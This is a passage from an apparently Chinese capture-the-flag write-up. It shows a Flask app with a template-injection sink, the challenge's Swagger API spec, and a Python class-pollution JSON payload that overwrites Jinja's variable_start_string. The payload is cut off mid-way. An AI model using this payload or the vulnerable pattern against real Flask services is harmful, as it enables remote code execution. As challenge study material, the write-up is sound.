request.args.get(<span class="string">&#x27;file&#x27;</span>) + <span class="string">&#x27;&amp;id=&#x27;</span> + <span class="built_in">id</span>)</span><br><span class="line">            <span class="keyword">if</span> data.status_code != <span class="number">200</span>:</span><br><span class="line">                <span class="keyword">return</span> data.status_code</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> request.args.get(<span class="string">&#x27;type&#x27;</span>) == <span class="string">&quot;text&quot;</span>:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> render_template_string(data.text)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> jsonify(json.loads(data.text))</span><br><span class="line">        <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;something error?&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(response2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>swagger-api的内容如下</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;swagger&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;info&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Interface API Documentation&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;title&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Interface API&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;paths&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;/api-base/v0/register&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;post&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;consumes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                    <span class="string">&quot;application/json&quot;</span></span><br><span class="line">                <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;summary&quot;</span><span class="punctuation">:</span> <span class="string">&quot;User Registration API&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Used for user registration&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;parameters&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                    <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;body&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;in&quot;</span><span class="punctuation">:</span> <span class="string">&quot;body&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;required&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;schema&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#/definitions/UserRegistration&quot;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;responses&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;200&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;success&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;400&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Invalid request parameters&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;/api-base/v0/login&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;post&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;consumes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                    <span class="string">&quot;application/json&quot;</span></span><br><span class="line">                <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;summary&quot;</span><span class="punctuation">:</span> <span class="string">&quot;User Login API&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Used for user login&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;parameters&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                    <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;body&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;in&quot;</span><span class="punctuation">:</span> <span class="string">&quot;body&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;required&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;schema&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#/definitions/UserLogin&quot;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;responses&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;200&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;success&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;400&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Invalid request parameters&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;/api-base/v0/search&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;get&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;summary&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Information Query API&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Used to query information&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;parameters&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                    <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;file&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;in&quot;</span><span class="punctuation">:</span> <span class="string">&quot;query&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;required&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;id&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;in&quot;</span><span class="punctuation">:</span> <span class="string">&quot;query&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;required&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;type&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;in&quot;</span><span class="punctuation">:</span> <span class="string">&quot;query&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;required&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Default JSON format.If type is &#x27;text&#x27;,Text format will be returned&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;responses&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;200&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;success&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;400&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Invalid request parameters&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;401&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Unauthorized&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;security&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                    <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;TokenAuth&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">]</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;/api-base/v0/update&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;post&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;consumes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                    <span class="string">&quot;application/json&quot;</span></span><br><span class="line">                <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;summary&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Change Password API&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Used to change user password&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;parameters&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                    <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;password&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;in&quot;</span><span class="punctuation">:</span> <span class="string">&quot;body&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;required&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;schema&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;object&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span></span><br><span class="line">                                <span class="punctuation">&#125;</span></span><br><span class="line">                            <span class="punctuation">&#125;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;responses&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;200&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;success&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;400&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Invalid request parameters&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;401&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Unauthorized&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;security&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                    <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;TokenAuth&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">]</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;/api-base/v0/logout&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;get&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;summary&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Logout API&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Used for user logout&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;responses&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;200&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;success&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;401&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Unauthorized&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;security&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                    <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;TokenAuth&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">]</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;definitions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;UserRegistration&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;object&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;UserLogin&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;object&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;securityDefinitions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;TokenAuth&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;apiKey&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Authorization&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;in&quot;</span><span class="punctuation">:</span> <span class="string">&quot;header&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;security&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;TokenAuth&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>放到postman测试后不难发现有任意文件读取的接口，然后就获得了一开始的源码，然后就知道有个python原型链污染，这里我第一眼就知道是污染模板标识符，但哈哈哈哈我打不通远程环境，本地倒是通了，就当歇逼了</p>
<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;<span class="built_in">_</span><span class="built_in">_</span>init<span class="built_in">_</span><span class="built_in">_</span>&quot; : &#123;</span><br><span class="line">        &quot;<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>&quot; : &#123;</span><br><span class="line">            &quot;app&quot; : &#123;</span><br><span class="line">                &quot;jinja<span class="built_in">_</span>env&quot; : &#123;&quot;variable<span class="built_in">_</span>start<span class="built_in">_</span>string&quot;:&quot;<span class="keyword">\u</span>0027<span class="keyword">\u</span>0022<span class="keyword">\u</span>0022<span class="keyword">\u</span>0027<span class="keyword">\u</span>005d<span class="keyword">\u</span>003a<span class="keyword">\u</span>000a<span class="keyword">\u</span>0020<span class="keyword">\u</span>0020<span class="keyword">\u</span>0020<span class="keyword">\u</span>0020<span class="keyword">\u</span>0020<span class="keyword">\u</span>0020<span class="keyword">\u</span>0020<span class="keyword">\u</span>0020<span class="keyword">\u</span>0020<span class="keyword">\u</span>0020<span class="keyword">\u</span>0020<span class="keyword">\u</span>0020<span class="keyword">\u</span>0076<span class="keyword">\u</span>0061<span class="keyword">\u</span>006c<span class="keyword">\u</span>0075<span class="keyword">\u</span>0065<span class="keyword">\u</span>0020<span class="keyword">\u</span>003d<span class="keyword">\u</span>0020&quot;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;<span class="built_in">_</span><span class="built_in">_</span>init<span class="built_in">_</span><span class="built_in">_</span>&quot; : &#123;</span><br><span class="line">        &quot;<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>&quot; : &#123;</span><br><span class="line">            &quot;app&quot; : &#123;</span><br><span class="line">                &quot;jinja<span class="built_in">_</span>env&quot; : &#123;&quot;variable<span 